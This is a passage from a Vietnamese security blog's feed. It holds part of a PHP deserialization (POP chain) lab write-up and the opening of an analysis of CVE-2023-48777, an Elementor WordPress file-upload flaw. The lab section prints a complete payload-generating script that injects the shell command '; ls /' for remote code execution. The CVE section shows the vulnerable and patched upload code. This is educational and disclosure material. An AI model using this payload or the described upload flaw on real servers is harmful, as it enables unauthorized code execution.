__get($attribute){&#xA;&#x9;&#x9;system(&amp;#39;echo &amp;#34;&amp;#39;.$this-&amp;gt;name.&amp;#39;&amp;#34; &amp;gt;&amp;gt; log.txt&amp;#39;);&#xA;&#x9;&#x9;return $this-&amp;gt;$attribute;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;return $this-&amp;gt;name;&#xA;&#x9;}&#xA;}&#xA;if (isset($_POST[&amp;#39;pop&amp;#39;])){&#xA;&#x9;unserialize(base64_decode($_POST[&amp;#39;pop&amp;#39;]));&#xA;}&#xA;?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;File chính có ba class quan trọng: &lt;code&gt;User&lt;/code&gt;, &lt;code&gt;Note&lt;/code&gt;, &lt;code&gt;Whale&lt;/code&gt;. Cuối file có dòng unserialize đầu vào nếu &lt;code&gt;$_POST[&#39;pop&#39;]&lt;/code&gt; được gửi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($_POST[&amp;#39;pop&amp;#39;])){&#xA;    unserialize(base64_decode($_POST[&amp;#39;pop&amp;#39;]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Những điểm đáng chú ý:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Dòng &lt;strong&gt;8&lt;/strong&gt;: &lt;code&gt;User::__wakeup()&lt;/code&gt; tạo một &lt;code&gt;Note&lt;/code&gt; và gán vào &lt;code&gt;$this-&amp;gt;memo&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Dòng &lt;strong&gt;23&lt;/strong&gt;: &lt;code&gt;Note::__toString()&lt;/code&gt; gọi &lt;code&gt;record()&lt;/code&gt; rồi trả về một chuỗi.&lt;/li&gt;&#xA;&lt;li&gt;Dòng &lt;strong&gt;28&lt;/strong&gt;: &lt;code&gt;Note::record()&lt;/code&gt; truy xuất &lt;code&gt;$whale-&amp;gt;$content&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Dòng &lt;strong&gt;44&lt;/strong&gt;: &lt;code&gt;Whale::__get()&lt;/code&gt; gọi &lt;code&gt;system(&#39;echo &amp;quot;&#39;.$this-&amp;gt;name.&#39;&amp;quot; &amp;gt;&amp;gt; log.txt&#39;);&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Dòng &lt;strong&gt;52&lt;/strong&gt;: vị trí gọi &lt;code&gt;unserialize(...)&lt;/code&gt; — điểm tấn công.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;luồng-thực-thi-dẫn-đến-shell&#34;&gt;&lt;span&gt;Luồng thực thi dẫn đến shell&lt;/span&gt;&#xA;  &lt;a href=&#34;#lu%e1%bb%93ng-th%e1%bb%b1c-thi-d%e1%ba%abn-%c4%91%e1%ba%bfn-shell&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Unserialize một &lt;code&gt;User&lt;/code&gt;&lt;/strong&gt;: Khi unserialize một object &lt;code&gt;User&lt;/code&gt;, magic method &lt;code&gt;__wakeup()&lt;/code&gt; sẽ chạy. Ở đây &lt;code&gt;__wakeup()&lt;/code&gt; khởi tạo một &lt;code&gt;Note&lt;/code&gt; mới bằng cách lấy &lt;code&gt;$this-&amp;gt;name . &amp;quot;say hello&amp;quot;&lt;/code&gt; làm content và &lt;code&gt;&#39;test_whale&#39;&lt;/code&gt; làm whale:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;memo = new Note($this-&amp;gt;name . &amp;#34;say hello&amp;#34;, &amp;#39;test_whale&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;Note::__toString()&lt;/code&gt; sẽ gọi &lt;code&gt;record()&lt;/code&gt;&lt;/strong&gt;: &lt;code&gt;__toString()&lt;/code&gt; trong &lt;code&gt;Note&lt;/code&gt; gọi &lt;code&gt;record($this-&amp;gt;whale, $this-&amp;gt;content)&lt;/code&gt; trước khi trả về chuỗi. &lt;code&gt;__toString()&lt;/code&gt; được gọi khi đối tượng bị ép sang chuỗi. Ta lợi dụng &lt;code&gt;$this-&amp;gt;name&lt;/code&gt; làm đối tượng của note sẽ bị ép sang chuỗi khi concat &lt;code&gt;&amp;quot;say hello&amp;quot;&lt;/code&gt; ở dòng 9.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;record()&lt;/code&gt; truy xuất thuộc tính động trên &lt;code&gt;$whale&lt;/code&gt;&lt;/strong&gt;: Trong &lt;code&gt;record()&lt;/code&gt; có dòng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$test = $whale-&amp;gt;$content;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu &lt;code&gt;$whale&lt;/code&gt; là một object &lt;code&gt;Whale&lt;/code&gt; và &lt;code&gt;$content&lt;/code&gt; không khớp thuộc tính tồn tại, PHP sẽ gọi magic &lt;code&gt;Whale::__get($attribute)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;Whale::__get()&lt;/code&gt; thực thi &lt;code&gt;system()&lt;/code&gt;&lt;/strong&gt;: &lt;code&gt;__get()&lt;/code&gt; của &lt;code&gt;Whale&lt;/code&gt; chứa:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;system(&amp;#39;echo &amp;#34;&amp;#39;.$this-&amp;gt;name.&amp;#39;&amp;#34; &amp;gt;&amp;gt; log.txt&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Vì &lt;code&gt;system()&lt;/code&gt; chạy shell, nếu &lt;code&gt;$this-&amp;gt;name&lt;/code&gt; chứa ký tự phá vỡ lệnh (ví dụ &lt;code&gt;&amp;quot;; ls /; echo &amp;quot;&lt;/code&gt;), attacker có thể chèn và thực thi lệnh shell dẫn tới RCE.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Tạo 1 file tương tự file gốc nhưng chứa code tạo serialize:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;class User{&#xA;&#x9;public $name;&#xA;&#x9;private $memo;&#xA;&#x9;function __construct(){&#xA;&#x9;&#x9;$this-&amp;gt;name= new Note(&amp;#34;Top2&amp;#34;,new Whale((&amp;#39;&amp;#34;; ls /; echo &amp;#34;&amp;#39;)));&#xA;&#x9;}&#xA;&#x9;function __wakeup(){&#xA;&#x9;&#x9;$this-&amp;gt;memo=new Note($this -&amp;gt; name.&amp;#34;say hello&amp;#34;, &amp;#39;test_whale&amp;#39;);&#xA;&#x9;}&#xA;&#x9;function __get($content){&#xA;&#x9;&#x9;return $this-&amp;gt;memo;&#xA;&#x9;}&#xA;}&#xA;class Note{&#xA;&#x9;public $content;&#xA;&#x9;public $whale;&#xA;&#x9;function __construct($content, $whale){&#xA;&#x9;&#x9;$this-&amp;gt;content=$content;&#xA;&#x9;&#x9;$this-&amp;gt;whale=$whale;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;$this-&amp;gt;record($this-&amp;gt;whale, $this-&amp;gt;content);&#xA;&#x9;&#x9;return &amp;#39;Record for &amp;#39;.$this-&amp;gt;whale.&amp;#39; is : &amp;#39;.$this-&amp;gt;content;&#xA;&#x9;}&#xA;&#x9;function record($whale, $content){&#xA;&#x9;&#x9;//check whether it&amp;#39;s an attribute&#xA;&#x9;&#x9;$test=$whale-&amp;gt;$content;&#xA;&#x9;&#x9;if ($test!=NULL){&#xA;&#x9;&#x9;&#x9;echo(&amp;#34;It&amp;#39;s probably an attribute&amp;#34;);&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&#xA;class Whale{&#xA;&#x9;public $name;&#xA;&#x9;private $note;&#xA;&#x9;function __construct($name){&#xA;&#x9;&#x9;$this-&amp;gt;name=$name;&#xA;&#x9;}&#xA;&#x9;function take_note($note){&#xA;&#x9;&#x9;$this-&amp;gt;note=date(&amp;#34;Y/m/d H:i:s&amp;#34;).$note;&#xA;&#x9;}&#xA;&#x9;function __get($attribute){&#xA;&#x9;&#x9;system(&amp;#39;echo &amp;#34;&amp;#39;.$this-&amp;gt;name.&amp;#39;&amp;#34; &amp;gt;&amp;gt; log.txt&amp;#39;);&#xA;&#x9;&#x9;return $this-&amp;gt;$attribute;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;return $this-&amp;gt;name;&#xA;&#x9;}&#xA;}&#xA;&#xA;$u = new User();&#xA;$searialize = serialize($u);&#xA;echo base64_encode(&amp;#39;&amp;#39;. $searialize .&amp;#39;&amp;#39;);&#xA;?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chạy file này và copy chuỗi base64 trả về:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/base64_return.png&#34; title=&#34;Chuỗi base64 trả về&#34; data-thumbnail=&#34;/posts/2025-11-11-pop-chain-lab1/base64_return.png&#34; data-sub-html=&#34;&lt;h2&gt;Base64&lt;/h2&gt;&lt;p&gt;Chuỗi base64 trả về&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/base64_return.png&#39; alt=&#34;Base64&#34; height=&#34;450&#34; width=&#34;1542&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Chuỗi base64 trả về&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Gửi request theo cú pháp challenge&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/result.png&#34; title=&#34;RCE thành công&#34; data-thumbnail=&#34;/posts/2025-11-11-pop-chain-lab1/result.png&#34; data-sub-html=&#34;&lt;h2&gt;RCE&lt;/h2&gt;&lt;p&gt;RCE thành công&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/result.png&#39; alt=&#34;RCE&#34; height=&#34;593&#34; width=&#34;1542&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE thành công&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2023-48777 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-10-cve-2023-48777/</link>
      <pubDate>Mon, 10 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-10-cve-2023-48777/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; trong &lt;strong&gt;Elementor Website Builder&lt;/strong&gt; plugin cho WordPress. Vấn đề này ảnh hưởng đến &lt;strong&gt;Elementor Website Builder&lt;/strong&gt;: từ phiên bản &lt;strong&gt;3.3.0&lt;/strong&gt; đến &lt;strong&gt;3.18.1&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-48777&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2023-48777&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.3.0-3.18.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.18.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Elementor Website Builder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Elementor Website Builder&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.3.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.18.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xuất phát từ việc &lt;strong&gt;không kiểm tra loại file (file type)&lt;/strong&gt; hợp lệ trước khi lưu trữ lên &lt;strong&gt;server&lt;/strong&gt;, cho phép kẻ tấn công tải lên các file có định dạng nguy hiểm.&lt;/p&gt;&#xA;&lt;p&gt;Trong phiên bản &lt;strong&gt;3.18.1&lt;/strong&gt;, hàm &lt;code&gt;handle_elementor_upload()&lt;/code&gt; không thực hiện xác minh &lt;code&gt;file type&lt;/code&gt; khi xử lý dữ liệu tải lên từ tham số &lt;code&gt;fileData&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) {&#xA;    if ( isset( $file[&amp;#39;fileData&amp;#39;] ) ) {&#xA;        $file = $this-&amp;gt;save_base64_to_tmp_file( $file );&#xA;    }&#xA;&#xA;    $validation_result = $this-&amp;gt;validate_file( $file, $allowed_file_extensions );&#xA;&#xA;    if ( is_wp_error( $validation_result ) ) {&#xA;        return $validation_result;&#xA;    }&#xA;&#xA;    return $file;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;private function save_base64_to_tmp_file( $file ) {&#xA;    $file_content = base64_decode( $file[&amp;#39;fileData&amp;#39;] ); // phpcs:ignore&#xA;&#xA;    // If the decode fails&#xA;    if ( ! $file_content ) {&#xA;        return new \WP_Error( &amp;#39;file_error&amp;#39;, self::INVALID_FILE_CONTENT );&#xA;    }&#xA;&#xA;    $temp_filename = $this-&amp;gt;create_temp_file( $file_content, $file[&amp;#39;fileName&amp;#39;] );&#xA;&#xA;    if ( is_wp_error( $temp_filename ) ) {&#xA;        return $temp_filename;&#xA;    }&#xA;&#xA;    return [&#xA;        // the original uploaded file name&#xA;        &amp;#39;name&amp;#39; =&amp;gt; $file[&amp;#39;fileName&amp;#39;],&#xA;        // The path to the temporary file&#xA;        &amp;#39;tmp_name&amp;#39; =&amp;gt; $temp_filename,&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong bản vá &lt;strong&gt;3.18.2&lt;/strong&gt;, nhà phát triển đã &lt;strong&gt;bổ sung kiểm tra loại file hợp lệ&lt;/strong&gt; trước khi lưu trữ bằng cách truyền thêm tham số &lt;code&gt;$allowed_file_extensions&lt;/code&gt; vào hàm &lt;code&gt;save_base64_to_tmp_file()&lt;/code&gt;, nhằm ngăn chặn việc tải lên các file độc hại:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) {&#xA;    if ( isset( $file[&amp;#39;fileData&amp;#39;] ) ) {&#xA;        $file = $this-&amp;gt;save_base64_to_tmp_file( $file, $allowed_file_extensions );&#xA;    }&#xA;&#xA;    $validation_result = $this-&amp;gt;validate_file( $file, $allowed_file_extensions );&#xA;&#xA;    if ( is_wp_error( $validation_result ) ) {&#xA;        return $validation_result;&#xA;    }&#xA;&#xA;    return $file;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;private function save_base64_to_tmp_file( $file, $allowed_file_extensions = null ) {&#xA;    $file_extension = pathinfo( $file[&amp;#39;fileName&amp;#39;], PATHINFO_EXTENSION );&#xA;    $is_file_type_allowed = $this-&amp;gt;is_file_type_allowed( $file_extension, $allowed_file_extensions );&#xA;&#xA;    if ( is_wp_error( $is_file_type_allowed ) ) {&#xA;        return $is_file_type_allowed;&#xA;    }&#xA;&#xA;    $file_content = base64_decode( $file[&amp;#39;fileData&amp;#39;] ); // phpcs:ignore&#xA;&#xA;    // If the decode fails&#xA;    if ( ! $file_content ) {&#xA;        return new \WP_Error( &amp;#39;file_error&amp;#39;, self::INVALID_FILE_CONTENT );&#xA;    }&#xA;&#xA;    $temp_filename = $this-&amp;gt;create_temp_file( $file_content, $file[&amp;#39;fileName&amp;#39;] );&#xA;&#xA;    if ( is_wp_error( $temp_filename ) ) {&#xA;        return $temp_filename;&#xA;    }&#xA;&#xA;    return [&#xA;        // the original uploaded file name&#xA;        &amp;#39;name&amp;#39; =&amp;gt; $file[&amp;#39;fileName&amp;#39;],&#xA;        // The path to the temporary file&#xA;        &amp;#39;tmp_name&amp;#39; =&amp;gt; $temp_filename,&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Quá trình upload &lt;strong&gt;template&lt;/strong&gt; có nội dung ở dạng &lt;strong&gt;Base64&lt;/strong&gt; được xử lý như sau: dữ liệu trong &lt;code&gt;$file[&#39;fileData&#39;]&lt;/code&gt; được &lt;strong&gt;giải mã bằng&lt;/strong&gt; &lt;code&gt;base64_decode&lt;/code&gt; và gán vào biến &lt;code&gt;$file_content&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$file_content = base64_decode( $file[&amp;#39;fileData&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi giải mã, hàm &lt;code&gt;save_base64_to_tmp_file()&lt;/code&gt; sẽ &lt;strong&gt;gọi đến&lt;/strong&gt; &lt;code&gt;create_temp_file()&lt;/code&gt; để &lt;strong&gt;lưu nội dung này thành file template&lt;/strong&gt; trên server:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function create_temp_file( $file_content, $file_name ) {&#xA;    $temp_filename = $this-&amp;gt;create_unique_dir() . $file_name;&#xA;&#xA;    file_put_contents( $temp_filename, $file_content ); // phpcs:ignore&#xA;&#xA;    return $temp_filename;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đường dẫn lưu file được tạo bằng cách nối &lt;code&gt;$file_name&lt;/code&gt; với kết quả trả về từ &lt;code&gt;create_unique_dir()&lt;/code&gt; - hàm này tạo đường dẫn lưu trữ &lt;strong&gt;template tạm thời&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function create_unique_dir() {&#xA;    $unique_dir_path = $this-&amp;gt;get_temp_dir() . uniqid() . DIRECTORY_SEPARATOR;&#xA;&#xA;    wp_mkdir_p( $unique_dir_path );&#xA;&#xA;    return $unique_dir_path;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;create_unique_dir()&lt;/code&gt; chịu trách nhiệm &lt;strong&gt;tạo thư mục chứa template tạm thời&lt;/strong&gt;, có dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp-content/uploads/elementor/tmp/&amp;lt;filename&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đó, &lt;code&gt;&amp;lt;uniqueId&amp;gt;&lt;/code&gt; được sinh tự động bằng &lt;a 